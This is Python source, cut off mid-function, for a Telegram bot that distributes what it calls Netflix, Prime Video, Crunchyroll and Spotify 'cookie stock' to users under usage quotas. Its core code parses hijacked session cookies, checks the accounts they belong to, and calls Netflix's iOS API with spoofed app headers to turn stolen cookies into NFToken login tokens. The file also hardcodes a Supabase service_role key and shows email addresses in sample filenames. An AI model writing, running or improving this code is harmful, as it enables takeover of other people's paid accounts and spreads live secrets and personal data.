import telebot
from telebot import types
import time
import languages
import os
from datetime import datetime, timedelta, timezone
from supabase import create_client
import requests
import json
import re
from urllib3.exceptions import InsecureRequestWarning
import urllib.parse
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

# ====================== CONFIG ======================
SUPABASE_URL = "https://omzmzjptwjqxvjfxtcaf.supabase.co"
SUPABASE_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im9tem16anB0d2pxeHZqZnh0Y2FmIiwicm9sZSI6InNlcnZpY2Vfcm9sZSIsImlhdCI6MTc3Mzg2ODg4MywiZXhwIjoyMDg5NDQ0ODgzfQ.q5WmCZynlkQQMV1WnXoiVfS5xJM0B2e8_JQUVrRQHdQ"
supabase = create_client(SUPABASE_URL, SUPABASE_KEY)
TOKEN = os.environ.get("BOT_TOKEN")
bot = telebot.TeleBot(TOKEN)

ADMIN_IDS = [7399488750]
ADMIN_PENDING = {}

USER_DATA = {}
STOCK = {
    "premium":     0,
    "standard":    0,
    "basic":       0,
    "prime":       0,
    "crunchyroll": 0,
    "spotify":     0
}

SERVICE_VISIBILITY = {
    "netflix":     True,
    "prime":       True,
    "crunchyroll": True,
    "spotify":     True
}

# ====================== NFTOKEN CONSTANTS ======================
NFTOKEN_API_URL = "https://ios.prod.ftl.netflix.com/iosui/user/15.48"
NFTOKEN_QUERY_PARAMS = {
    "appVersion": "15.48.1",
    "config": '{"gamesInTrailersEnabled":"false","isTrailersEvidenceEnabled":"false","cdsMyListSortEnabled":"true","kidsBillboardEnabled":"true","billboardEnabled":"true","sharksEnabled":"true"}',
    "device_type": "NFAPPL-02-",
    "esn": "NFAPPL-02-IPHONE8%3D1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
    "idiom": "phone",
    "iosVersion": "15.8.5",
    "isTablet": "false",
    "languages": "en-US",
    "locale": "en-US",
    "maxDeviceWidth": "375",
    "model": "saget",
    "modelType": "IPHONE8-1",
    "odpAware": "true",
    "path": '["account","token","default"]',
    "pathFormat": "graph",
    "pixelDensity": "2.0",
    "progressive": "false",
    "responseFormat": "json",
}
NFTOKEN_HEADERS = {
    "User-Agent": "Argo/15.48.1 (iPhone; iOS 15.8.5; Scale/2.00)",
    "x-netflix.request.attempt": "1",
    "x-netflix.request.client.user.guid": "A4CS633D7VCBPE2GPK2HL4EKOE",
    "x-netflix.context.profile-guid": "A4CS633D7VCBPE2GPK2HL4EKOE",
    "x-netflix.request.routing": '{"path":"/nq/mobile/nqios/~15.48.0/user","control_tag":"iosui_argo"}',
    "x-netflix.context.app-version": "15.48.1",
    "x-netflix.argo.translated": "true",
    "x-netflix.context.form-factor": "phone",
    "x-netflix.context.sdk-version": "2012.4",
    "x-netflix.client.appversion": "15.48.1",
    "x-netflix.context.max-device-width": "375",
    "x-netflix.context.ab-tests": "",
    "x-netflix.tracing.cl.useractionid": "4DC655F2-9C3C-4343-8229-CA1B003C3053",
    "x-netflix.client.type": "argo",
    "x-netflix.client.ftl.esn": "NFAPPL-02-IPHONE8=1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
    "x-netflix.context.locales": "en-US",
    "x-netflix.context.top-level-uuid": "90AFE39F-ADF1-4D8A-B33E-528730990FE3",
    "x-netflix.client.iosversion": "15.8.5",
    "accept-language": "en-US;q=1",
    "x-netflix.argo.abtests": "",
    "x-netflix.context.os-version": "15.8.5",
    "x-netflix.request.client.context": '{"appState":"foreground"}',
    "x-netflix.context.ui-flavor": "argo",
    "x-netflix.argo.nfnsm": "9",
    "x-netflix.context.pixel-density": "2.0",
    "x-netflix.request.toplevel.uuid": "90AFE39F-ADF1-4D8A-B33E-528730990FE3",
    "x-netflix.request.client.timezoneid": "Asia/Dhaka",
}

def netflix_tier_markup_by_country(country, lang="en"):
    # Get counts only for this country
    try:
        result = supabase.table("vamt_keys") \
            .select("service_type") \
            .like("service_type", "Netflix%") \
            .eq("country", country) \
            .gt("remaining", 0) \
            .execute()

        premium_count = 0
        standard_count = 0
        basic_count = 0

        for row in result.data:
            stype = row.get("service_type", "")
            if "Premium" in stype:
                premium_count += 1
            elif "Standard" in stype:
                standard_count += 1
            elif "Basic" in stype:
                basic_count += 1

    except:
        premium_count = standard_count = basic_count = 0

    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        types.InlineKeyboardButton(f"👑 Premium ({premium_count})", callback_data=f"tier_premium_{country}"),
        types.InlineKeyboardButton(f"⭐ Standard ({standard_count})", callback_data=f"tier_standard_{country}")
    )
    markup.add(types.InlineKeyboardButton(f"🔴 Basic ({basic_count})", callback_data=f"tier_basic_{country}"))
    markup.add(types.InlineKeyboardButton("🌍 By Country", callback_data="by_country_netflix"))
    markup.add(types.InlineKeyboardButton("🏠 Main Menu", callback_data="main_menu"))
    return markup

# ====================== SUPABASE HELPERS ======================
def fetch_cookie_from_db(tier, country=None):
    import random
    tier_map = {
        "premium":  "Netflix Premium",
        "standard": "Netflix Standard",
        "basic":    "Netflix Basic",
    }
    service_prefix = tier_map.get(tier)
    if not service_prefix:
        return None
    try:
        query = supabase.table("vamt_keys") \
            .select("*") \
            .like("service_type", f"{service_prefix}%") \
            .gt("remaining", 0)

        if country:
            query = query.eq("country", country)

        result = query.limit(50).execute()

        if not result.data:
            return None

        row = random.choice(result.data)

        pk_col = "public_id" if "public_id" in row else None
        if pk_col:
            supabase.table("vamt_keys") \
                .update({"last_used_at": datetime.now(timezone.utc).isoformat()}) \
                .eq(pk_col, row[pk_col]) \
                .execute()

        return row
    except Exception as e:
        print(f"[Supabase Error] fetch_cookie_from_db: {e}")
        return None

def sync_visibility_from_db():
    try:
        result = supabase.table("bot_settings").select("*").execute()
        for row in result.data:
            key = row.get("key")
            val = row.get("value")
            if key in SERVICE_VISIBILITY:
                SERVICE_VISIBILITY[key] = bool(val)
        print(f"✅ Visibility synced: {SERVICE_VISIBILITY}")
    except Exception as e:
        print(f"[Visibility sync error] {e}")

def push_visibility_to_db(service, value):
    try:
        supabase.table("bot_settings").upsert({
            "key": service,
            "value": value
        }).execute()
    except Exception as e:
        print(f"[Visibility push error] {e}")

def sync_stock_from_db():
    tier_map = {
        "Netflix Premium":      "premium",
        "Netflix Standard With Ads": "standard",  # counts as standard
        "Netflix Standard":     "standard",
        "Netflix Basic":        "basic",
        "Netflix Mobile":       "basic",           # optional
    }
    try:
        result = supabase.table("vamt_keys") \
            .select("service_type") \
            .gt("remaining", 0) \
            .like("service_type", "Netflix%") \
            .execute()

        counts = {}
        for row in result.data:
            stype = row.get("service_type") or ""
            for prefix, key in tier_map.items():
                if stype.startswith(prefix):
                    counts[key] = counts.get(key, 0) + 1
                    break  # ← stop after first match to avoid double-counting

        for key, val in counts.items():
            STOCK[key] = val
        print(f"✅ Stock synced: {counts}")
    except Exception as e:
        print(f"[Stock sync error] {e}")

# ====================== IMPROVED COOKIE EXTRACTION (SINGLE VERSION) ======================

COOKIE_KEYS = ("NetflixId", "SecureNetflixId", "nfvdid", "OptanonConsent")

def parse_netscape_cookie_line(line):
    parts = line.strip().split("\t")
    if len(parts) >= 7:
        return {parts[5]: parts[6]}
    return {}

def _decode_cookie_value(value):
    if isinstance(value, str) and "%" in value:
        try:
            return urllib.parse.unquote(value)
        except Exception:
            return value
    return value

def parse_cookie_dict(text):
    """
    Robust cookie parser used in both checker.py and Nightflix bot.
    Supports Netscape, JSON, and key=value formats.
    """
    cookie_dict = {}

    # 1. Netscape format (tab-separated)
    for raw_line in text.splitlines():
        line = raw_line.strip()
        if not line or line.startswith("#"):
            continue
        cookie_dict.update(parse_netscape_cookie_line(line))

    # 2. JSON format
    try:
        data = json.loads(text)
    except (json.JSONDecodeError, TypeError):
        data = None

    if isinstance(data, list):
        for cookie in data:
            name = cookie.get("name")
            value = cookie.get("value")
            if name in COOKIE_KEYS and isinstance(value, str):
                cookie_dict[name] = _decode_cookie_value(value)
    elif isinstance(data, dict):
        if any(key in data for key in COOKIE_KEYS):
            for key in COOKIE_KEYS:
                value = data.get(key)
                if isinstance(value, str):
                    cookie_dict[key] = _decode_cookie_value(value)
        elif isinstance(data.get("cookies"), list):
            for cookie in data["cookies"]:
                name = cookie.get("name")
                value = cookie.get("value")
                if name in COOKIE_KEYS and isinstance(value, str):
                    cookie_dict[name] = _decode_cookie_value(value)

    # 3. key=value format fallback
    for key in COOKIE_KEYS:
        if key in cookie_dict:
            continue
        match = re.search(rf"(?<!\w){re.escape(key)}=([^;,\s]+)", text, re.IGNORECASE)
        if match:
            cookie_dict[key] = _decode_cookie_value(match.group(1))

    return cookie_dict

def create_nftoken(cookie_dict, attempts=3):
    """
    Improved NFToken generator.
    - Supports both NetflixId + SecureNetflixId (big success rate improvement)
    - Better error handling and retries
    """
    netflix_id = cookie_dict.get("NetflixId") or cookie_dict.get("netflixid")
    secure_id = cookie_dict.get("SecureNetflixId") or cookie_dict.get("securenetflixid")

    if not netflix_id:
        return None, "Missing NetflixId cookie"

    headers = dict(NFTOKEN_HEADERS)
    cookie_str = f"NetflixId={netflix_id}"
    if secure_id:
        cookie_str += f"; SecureNetflixId={secure_id}"
    headers["Cookie"] = cookie_str

    last_error = "NFToken API error"

    for attempt in range(max(1, attempts)):
        try:
            r = requests.get(
                NFTOKEN_API_URL,
                params=NFTOKEN_QUERY_PARAMS,
                headers=headers,
                timeout=30,
                verify=False,
            )
            print(f"[NFToken] attempt={attempt+1} status={r.status_code}")

            if r.status_code == 200:
                data = r.json()
                token_data = (
                    (((data.get("value") or {}).get("account") or {})
                     .get("token") or {}).get("default") or {}
                )
                token = token_data.get("token")
                expires = token_data.get("expires")

                if token:
                    if isinstance(expires, int) and len(str(expires)) == 13:
                        expires //= 1000
                    print(f"[NFToken] token=found")
                    return {"token": token, "expires_at": expires}, None

                last_error = "No token in response"
            elif r.status_code == 403:
                last_error = "403 Forbidden (cookie expired or insufficient)"
                break
            elif r.status_code == 429:
                last_error = "Rate limited"
                time.sleep(2)
            else:
                last_error = f"HTTP {r.status_code}"

        except Exception as e:
            last_error = str(e)[:120]
            print(f"[NFToken error] attempt={attempt+1} {last_error}")

        if attempt < attempts - 1:
            time.sleep(1.5)

    return None, last_error

def check_netflix_account(cookie_dict):
    """
    Fetch real account data from Netflix.
    Hits /account/membership first (best data source),
    then falls back to /YourAccount and merges — same logic as standalone checker.
    Does NOT break early so all fields (quality, streams, price etc.) are collected.
    """
    netflix_id = cookie_dict.get("NetflixId", "").strip()
    if not netflix_id:
        return None

    session = requests.Session()
    for name, value in cookie_dict.items():
        if value:
            session.cookies.set(name, value, domain=".netflix.com")

    headers = {
        "User-Agent": (
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
            "AppleWebKit/537.36 (KHTML, like Gecko) "
            "Chrome/124.0.0.0 Safari/537.36"
        ),
        "Accept-Encoding": "identity",
    }

    # Import the accurate extract/merge functions from your standalone checker
    from checker import extract_info, merge_info, has_complete_account_info

    info = {}

    # Primary page — richest data source
    try:
        resp = session.get(
            "https://www.netflix.com/account/membership",
            headers=headers,
            timeout=25,
            allow_redirects=True,
        )
        print(f"[Account] /account/membership status={resp.status_code}")
        if resp.status_code == 200 and resp.text:
            info = extract_info(resp.text) or {}
    except Exception as e:
        print(f"[Account error] /account/membership: {e}")

    # If primary gave us complete info, we're done
    if has_complete_account_info(info):
        print(f"[Account] complete info from primary page")
        return info

    # Fallback — merge whatever /YourAccount adds
    try:
        resp2 = session.get(
            "https://www.netflix.com/YourAccount",
            headers=headers,
            timeout=25,
            allow_redirects=True,
        )
        print(f"[Account] /YourAccount status={resp2.status_code}")
        if resp2.status_code == 200 and resp2.text:
            fallback_info = extract_info(resp2.text) or {}
            info = merge_info(info, fallback_info)
    except Exception as e:
        print(f"[Account error] /YourAccount: {e}")

    return info if info else None

def get_prime_filename():
    import random
    samples = [
        "[Primevideo][gianluca][IT][Tested By @caydigitals].txt",
        "[Primevideo][marcos][BR][Tested By @caydigitals].txt",
        "[Primevideo][john][US][Tested By @caydigitals].txt",
        "[Primevideo][akira][JP][Tested By @caydigitals].txt",
    ]
    return random.choice(samples)

def get_spotify_filename():
    import random
    samples = [
        "[Premium][1 payments][extra Recurring][IN][omkshirsagar7666@gmail.com][Tested By @caydigitals].txt",
        "[Family Premium][1 payments][extra Single Payment][GB][monkmoley@gmail.com][Tested By @caydigitals].txt",
        "[Premium][1 payments][extra Recurring][US][johnsmith99@gmail.com][Tested By @caydigitals].txt",
        "[Family Premium][1 payments][extra Single Payment][BR][marcos.silva@gmail.com][Tested By @caydigitals].txt",
    ]
    return random.choice(samples)

# ====================== USER DATA ======================
def get_user_data(chat_id):
    if chat_id not in USER_DATA:
        USER_DATA[chat_id] = {
            "used": {k: 0 for k in ("premium","standard","basic","prime","crunchyroll","spotify")},
            "tier_reset": {k: None for k in ("premium","standard","basic","prime","crunchyroll","spotify")},
            "lang": "en"
        }
    data = USER_DATA[chat_id]
    for key in ("crunchyroll", "spotify"):
        data["used"].setdefault(key, 0)
        data.setdefault("tier_reset", {})[key] = data.get("tier_reset", {}).get(key)
    now = datetime.now()
    for t in list(data["used"]):
        reset_at = (data.get("tier_reset") or {}).get(t)
        if reset_at and now >= reset_at:
            data["used"][t] = 0
            data["tier_reset"][t] = None
    return data

# ====================== KEYBOARDS ======================
def main_menu_markup(lang="en"):
    markup = types.InlineKeyboardMarkup(row_width=3)
    row1 = []
    if SERVICE_VISIBILITY["netflix"]:
        row1.append(types.InlineKeyboardButton("🎬 Netflix", callback_data="netflix"))
    if SERVICE_VISIBILITY["prime"]:
        row1.append(types.InlineKeyboardButton("🍿 Prime Video", callback_data="prime"))
    if row1:
        markup.add(*row1)
    row2 = []
    if SERVICE_VISIBILITY["crunchyroll"]:
        row2.append(types.InlineKeyboardButton("🦊 Crunchyroll", callback_data="crunchyroll"))
    if SERVICE_VISIBILITY["spotify"]:
        row2.append(types.InlineKeyboardButton("🎵 Spotify", callback_data="spotify"))
    if row2:
        markup.add(*row2)
    markup.add(
        types.InlineKeyboardButton(languages.get_text(lang, "btn_status"), callback_data="status"),
        types.InlineKeyboardButton(languages.get_text(lang, "btn_stock"),  callback_data="stock"),
        types.InlineKeyboardButton(languages.get_text(lang, "btn_help"),   callback_data="help")
    )
    markup.add(types.InlineKeyboardButton(languages.get_text(lang, "btn_language"), callback_data="language"))
    return markup

def netflix_tier_markup(lang="en"):
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        types.InlineKeyboardButton(languages.get_text(lang, "btn_premium",  n=STOCK["premium"]),  callback_data="tier_premium"),
        types.InlineKeyboardButton(languages.get_text(lang, "btn_standard", n=STOCK["standard"]), callback_data="tier_standard")
    )
    markup.add(types.InlineKeyboardButton(languages.get_text(lang, "btn_basic", n=STOCK["basic"]), callback_data="tier_basic"))
    markup.add(types.InlineKeyboardButton(languages.get_text(lang, "btn_by_country"), callback_data="by_country_netflix"))
    markup.add(types.InlineKeyboardButton(languages.get_text(lang, "btn_main_menu"),  callback_data="main_menu"))
    return markup

def prime_tier_markup(lang="en"):
    markup = types.InlineKeyboardMarkup(row_width=1)
    markup.add(types.InlineKeyboardButton(languages.get_text(lang, "btn_prime_video", n=STOCK["prime"]), callback_data="tier_prime"))
    markup.add(types.InlineKeyboardButton(languages.get_text(lang, "btn_by_country"), callback_data="by_country_prime"))
    markup.add(types.InlineKeyboardButton(languages.get_text(lang, "btn_main_menu"),  callback_data="main_menu"))
    return markup

def crunchyroll_markup(lang="en"):
    markup = types.InlineKeyboardMarkup(row_width=1)
    markup.add(types.InlineKeyboardButton(f"🦊 Crunchyroll ({STOCK['crunchyroll']})", callback_data="tier_crunchyroll"))
    markup.add(types.InlineKeyboardButton(languages.get_text(lang, "btn_by_country"), callback_data="by_country_crunchyroll"))
    markup.add(types.InlineKeyboardButton(languages.get_text(lang, "btn_main_menu"),  callback_data="main_menu"))
    return markup

def spotify_markup(lang="en"):
    markup = types.InlineKeyboardMarkup(row_width=1)
    markup.add(types.InlineKeyboardButton(f"🎵 Spotify ({STOCK['spotify']})", callback_data="tier_spotify"))
    markup.add(types.InlineKeyboardButton(languages.get_text(lang, "btn_by_country"), callback_data="by_country_spotify"))
    markup.add(types.InlineKeyboardButton(languages.get_text(lang, "btn_main_menu"),  callback_data="main_menu"))
    return markup

def lang_markup():
    markup = types.InlineKeyboardMarkup(row_width=3)
    markup.add(
        types.InlineKeyboardButton("🇬🇧 English",   callback_data="lang_en"),
        types.InlineKeyboardButton("🇪🇸 Español",   callback_data="lang_es"),
        types.InlineKeyboardButton("🇫🇷 Français",  callback_data="lang_fr"),
    )
    markup.add(
        types.InlineKeyboardButton("🇧🇷 Português", callback_data="lang_pt"),
        types.InlineKeyboardButton("🇸🇦 العربية",   callback_data="lang_ar"),
        types.InlineKeyboardButton("🇮🇳 हिन्दी",     callback_data="lang_hi"),
    )
    markup.add(
        types.InlineKeyboardButton("🇮🇩 Indonesia", callback_data="lang_id"),
        types.InlineKeyboardButton("🇷🇺 Русский",   callback_data="lang_ru"),
        types.InlineKeyboardButton("🇹🇷 Türkçe",    callback_data="lang_tr"),
    )
    markup.add(
        types.InlineKeyboardButton("🇩🇪 Deutsch",   callback_data="lang_de"),
        types.InlineKeyboardButton("🇮🇹 Italiano",  callback_data="lang_it"),
        types.InlineKeyboardButton("🇯🇵 日本語",     callback_data="lang_ja"),
    )
    markup.add(types.InlineKeyboardButton("🇰🇷 한국어", callback_data="lang_ko"))
    return markup

def country_service_markup(country):
    markup = types.InlineKeyboardMarkup(row_width=2)
    row = []
    if SERVICE_VISIBILITY["netflix"]:
        row.append(types.InlineKeyboardButton(f"🎬 Netflix ({country})", callback_data=f"country_netflix_{country}"))
    if SERVICE_VISIBILITY["prime"]:
        row.append(types.InlineKeyboardButton(f"🍿 Prime Video ({country})", callback_data=f"country_prime_{country}"))
    if row:
        markup.add(*row)
    row2 = []
    if SERVICE_VISIBILITY["crunchyroll"]:
        row2.append(types.InlineKeyboardButton(f"🦊 Crunchyroll ({country})", callback_data=f"country_crunchyroll_{country}"))
    if SERVICE_VISIBILITY["spotify"]:
        row2.append(types.InlineKeyboardButton(f"🎵 Spotify ({country})", callback_data=f"country_spotify_{country}"))
    if row2:
        markup.add(*row2)
    markup.add(types.InlineKeyboardButton("🏠 Main Menu", callback_data="main_menu"))
    return markup

def admin_stock_markup():
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        types.InlineKeyboardButton(f"🔥 Premium ({STOCK['premium']})",         callback_data="admin_set_premium"),
        types.InlineKeyboardButton(f"⭐ Standard ({STOCK['standard']})",        callback_data="admin_set_standard"),
    )
    markup.add(
        types.InlineKeyboardButton(f"🎯 Basic ({STOCK['basic']})",              callback_data="admin_set_basic"),
        types.InlineKeyboardButton(f"🍿 Prime ({STOCK['prime']})",              callback_data="admin_set_prime"),
    )
    markup.add(
        types.InlineKeyboardButton(f"🦊 Crunchyroll ({STOCK['crunchyroll']})", callback_data="admin_set_crunchyroll"),
        types.InlineKeyboardButton(f"🎵 Spotify ({STOCK['spotify']})",          callback_data="admin_set_spotify"),
    )
    markup.add(types.InlineKeyboardButton("━━━━ VISIBILITY TOGGLES ━━━━", callback_data="noop"))
    markup.add(
        types.InlineKeyboardButton(f"{'✅' if SERVICE_VISIBILITY['netflix'] else '❌'} Netflix",         callback_data="admin_toggle_netflix"),
        types.InlineKeyboardButton(f"{'✅' if SERVICE_VISIBILITY['prime'] else '❌'} Prime Video",       callback_data="admin_toggle_prime"),
    )
    markup.add(
        types.InlineKeyboardButton(f"{'✅' if SERVICE_VISIBILITY['crunchyroll'] else '❌'} Crunchyroll", callback_data="admin_toggle_crunchyroll"),
        types.InlineKeyboardButton(f"{'✅' if SERVICE_VISIBILITY['spotify'] else '❌'} Spotify",         callback_data="admin_toggle_spotify"),
    )
    markup.add(
        types.InlineKeyboardButton("🔄 Sync Stock from DB", callback_data="admin_sync_stock"),
        types.InlineKeyboardButton("🔄 Reset All to 0",     callback_data="admin_reset_all"),
    )
    markup.add(types.InlineKeyboardButton("🏠 Main Menu", callback_data="main_menu"))
    return markup

# ====================== BUILD FUNCTIONS ======================
def get_service_info(tier):
    mapping = {
        "premium":     ("🎬", "NETFLIX"),
        "standard":    ("🎬", "NETFLIX"),
        "basic":       ("🎬", "NETFLIX"),
        "prime":       ("🍿", "PRIME VIDEO"),
        "crunchyroll": ("🦊", "CRUNCHYROLL"),
        "spotify":     ("🎵", "SPOTIFY"),
    }
    return mapping.get(tier, ("🔑", tier.upper()))

def get_back_markup(tier, lang):
    if tier == "prime":
        return prime_tier_markup(lang), "choose_prime"
    elif tier == "crunchyroll":
        return crunchyroll_markup(lang), "🔽 Choose a tier for <b>Crunchyroll</b>:"
    elif tier == "spotify":
        return spotify_markup(lang), "🔽 Choose a tier for <b>Spotify</b>:"
    else:
        return netflix_tier_markup(lang), "choose_netflix"

def build_home(chat_id, lang="en"):
    user = get_user_data(chat_id)
    try:
        chat = bot.get_chat(chat_id)
        name = chat.first_name or "User"
    except Exception:
        name = "User"
    lang_name = languages.get_lang_name(lang)
    text  = languages.get_text(lang, "home_welcome", name=name.upper()) + "\n"
    text += languages.get_text(lang, "home_profile") + "\n"
    text += f"  ├ 📛 <b>Name:</b> <code>{name}</code>\n"
    text += f"  ├ 🆔 <b>User ID:</b> <code>{chat_id}</code>\n"
    text += f"  ├ 🌐 <b>Language:</b> <code>{lang_name}</code>\n"
    text += f"  └ 🏅 <b>Status:</b> <code>{languages.get_text(lang, 'home_active')}</code>\n\n"
    text += languages.get_text(lang, "home_live_line") + "\n\n"
    text += languages.get_text(lang, "home_rules_header") + "\n"
    text += "  • 📈 " + languages.get_text(lang, "home_rule1") + "\n"
    text += "  • 🔄 " + languages.get_text(lang, "home_rule2") + "\n"
    text += "  • ❌ " + languages.get_text(lang, "home_rule3") + "\n\n"
    text += languages.get_text(lang, "home_status_hdr") + "\n"
    text += "──────────────────────"
    tiers = []
    if SERVICE_VISIBILITY["netflix"]:
        tiers += [("premium","🔥 PREMIUM TIER"),("standard","⭐ STANDARD TIER"),("basic","🎯 BASIC TIER")]
    if SERVICE_VISIBILITY["prime"]:
        tiers += [("prime","🍿 PRIME VIDEO TIER")]
    if SERVICE_VISIBILITY["crunchyroll"]:
        tiers += [("crunchyroll","🦊 CRUNCHYROLL TIER")]
    if SERVICE_VISIBILITY["spotify"]:
        tiers += [("spotify","🎵 SPOTIFY TIER")]
    for t, label in tiers:
        used     = user["used"].get(t, 0)
        stock    = STOCK.get(t, 0)
        reset_at = (user.get("tier_reset") or {}).get(t)
        now      = datetime.now()
        if used >= 3 and reset_at and now < reset_at:
            diff = reset_at - now
            m = int(diff.total_seconds() // 60)
            s = int(diff.total_seconds() % 60)
            resets_str = languages.get_text(lang, "resets_soon", m=m, s=s)
        else:
            resets_str = languages.get_text(lang, "resets_none")
        oos = languages.get_text(lang, "home_oos")
        low = languages.get_text(lang, "home_low")
        if stock == 0:
            stock_str = f"🔴 {oos}"
        elif stock <= 10:
            stock_str = f"🟡 {stock} accounts ({low})"
        else:
            stock_str = f"🟢 {stock} accounts"
        bar = "🟥🟥🟥" if used >= 3 else "🟩" * used + "⬜" * (3 - used)
        text += f"\n<b>{label}</b>\n"
        text += f"  ├ 📦 <b>Stock:</b> <code>{stock_str}</code>\n"
        text += f"  ├ 📈 <b>Usage:</b> <code>{used}/3</code> [{bar}]\n"
        text += f"  └ 🔄 <b>Reset:</b> <code>{resets_str}</code>"
    text += "\n" + languages.get_text(lang, "home_choose")
    return text, main_menu_markup(lang)

def build_status(chat_id, lang="en"):
    user = get_user_data(chat_id)
    text = languages.get_text(lang, "status_title")
    tier_keys = []
    if SERVICE_VISIBILITY["netflix"]:
        tier_keys += [("premium","tier_premium"),("standard","tier_standard"),("basic","tier_basic")]
    if SERVICE_VISIBILITY["prime"]:
        tier_keys += [("prime","tier_prime")]
    if SERVICE_VISIBILITY["crunchyroll"]:
        tier_keys += [("crunchyroll","🦊 CRUNCHYROLL TIER")]
    if SERVICE_VISIBILITY["spotify"]:
        tier_keys += [("spotify","🎵 SPOTIFY TIER")]
    for t, name_key in tier_keys:
        used     = user["used"].get(t, 0)
        left     = max(0, 3 - used)
        stock    = STOCK.get(t, 0)
        reset_at = (user.get("tier_reset") or {}).get(t)
        now      = datetime.now()
        if used >= 3 and reset_at and now < reset_at:
            diff = reset_at - now
            m = int(diff.total_seconds() // 60)
            s = int(diff.total_seconds() % 60)
            resets_str = languages.get_text(lang, "resets_soon", m=m, s=s)
        else:
            resets_str = languages.get_text(lang, "resets_none")
        name_str = languages.get_text(lang, name_key) if name_key.startswith("tier_") else name_key
        text += languages.get_text(lang, "status_tier", name=name_str, used=used, left=left, stock=stock, resets=resets_str)
    text += languages.get_text(lang, "status_footer")
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton(languages.get_text(lang, "btn_refresh"),   callback_data="status"))
    markup.add(types.InlineKeyboardButton(languages.get_text(lang, "btn_main_menu"), callback_data="main_menu"))
    return text, markup

def build_stock(lang="en"):
    text = "📦 📦 <b>COOKIE STOCK</b>\n━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
    items = []
    if SERVICE_VISIBILITY["netflix"]:
        items += [("premium","🔥 PREMIUM"),("standard","⭐ STANDARD"),("basic","🎯 BASIC")]
    if SERVICE_VISIBILITY["prime"]:
        items += [("prime","🍿 PRIME VIDEO")]
    if SERVICE_VISIBILITY["crunchyroll"]:
        items += [("crunchyroll","🦊 CRUNCHYROLL")]
    if SERVICE_VISIBILITY["spotify"]:
        items += [("spotify","🎵 SPOTIFY")]
    for t, label in items:
        count = STOCK[t]
        if count == 0:
            bar = "⬜⬜⬜⬜⬜⬜⬜⬜⬜⬜"
        elif count <= 10:
            filled = max(1, count // 30)
            bar = "🟩" * filled + "⬜" * (10 - filled)
        else:
            bar = "🟩🟩🟩🟩🟩🟩🟩🟩🟩🟩"
        text += f"<b>{label}:</b> <code>{count} accounts</code>\n{bar}\n\n"
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton(languages.get_text(lang, "btn_refresh"),   callback_data="stock"))
    markup.add(types.InlineKeyboardButton(languages.get_text(lang, "btn_main_menu"), callback_data="main_menu"))
    return text, markup

def build_help(lang="en"):
    text = languages.get_text(lang, "help_text")
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton(languages.get_text(lang, "btn_language"),  callback_data="language"))
    markup.add(types.InlineKeyboardButton(languages.get_text(lang, "btn_main_menu"), callback_data="main_menu"))
    return text, markup

def build_lang(lang="en"):
    return languages.get_text(lang, "select_language"), lang_markup()

# ====================== HELPERS ======================
def edit_current_message(call, text, reply_markup=None):
    try:
        bot.edit_message_text(
            chat_id=call.message.chat.id,
            message_id=call.message.message_id,
            text=text,
            reply_markup=reply_markup,
            parse_mode="HTML"
        )
    except telebot.apihelper.ApiTelegramException as e:
        if "message is not modified" not in str(e):
            bot.send_message(call.message.chat.id, text, reply_markup=reply_markup, parse_mode="HTML")

def get_lang(chat_id):
    return get_user_data(chat_id).get("lang", "en")

# ====================== COMMANDS ======================
@bot.message_handler(commands=['start'])
def start_command(message):
    lang = get_lang(message.chat.id)
    text, markup = build_home(message.chat.id, lang)
    bot.send_message(message.chat.id, text, reply_markup=markup, parse_mode="HTML")

@bot.message_handler(commands=['status'])
def status_command(message):
    lang = get_lang(message.chat.id)
    text, markup = build_status(message.chat.id, lang)
    bot.send_message(message.chat.id, text, reply_markup=markup, parse_mode="HTML")

@bot.message_handler(commands=['stock'])
def stock_command(message):
    lang = get_lang(message.chat.id)
    text, markup = build_stock(lang)
    bot.send_message(message.chat.id, text, reply_markup=markup, parse_mode="HTML")

@bot.message_handler(commands=['lang'])
def lang_command(message):
    lang = get_lang(message.chat.id)
    text, markup = build_lang(lang)
    bot.send_message(message.chat.id, text, reply_markup=markup, parse_mode="HTML")

@bot.message_handler(commands=['country'])
def country_handler(message):
    try:
        country = message.text.split(maxsplit=1)[1].upper().strip()
        chat_id = message.chat.id

        USER_DATA.setdefault(chat_id, {})
        # Check if user came from a specific service's By Country button
        pending_service = USER_DATA[chat_id].pop("pending_country_service", None)
        USER_DATA[chat_id]["selected_country"] = country
        lang = get_lang(chat_id)

        if pending_service == "netflix":
            bot.send_message(chat_id,
                f"🔽 <b>Choose a Netflix tier for {country}:</b>",
                reply_markup=netflix_tier_markup_by_country(country),
                parse_mode="HTML"
            )
        elif pending_service == "prime":
            bot.send_message(chat_id,
                f"🔽 Choose a tier for <b>Prime Video ({country})</b>:",
                reply_markup=prime_tier_markup(lang),
                parse_mode="HTML"
            )
        elif pending_service == "crunchyroll":
            bot.send_message(chat_id,
                f"🔽 Choose a tier for <b>Crunchyroll ({country})</b>:",
                reply_markup=crunchyroll_markup(lang),
                parse_mode="HTML"
            )
        elif pending_service == "spotify":
            bot.send_message(chat_id,
                f"🔽 Choose a tier for <b>Spotify ({country})</b>:",
                reply_markup=spotify_markup(lang),
                parse_mode="HTML"
            )
        else:
            # No pending service = /country typed directly → show all services
            bot.send_message(chat_id,
                f"🌍 <b>Country: {country}</b>\n\nChoose a system for <b>{country}</b>:",
                reply_markup=country_service_markup(country),
                parse_mode="HTML"
            )
    except:
        bot.reply_to(message,
            "🌍 <b>Get Cookies by Country</b>\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            "Use: <code>/country IN</code>\n"
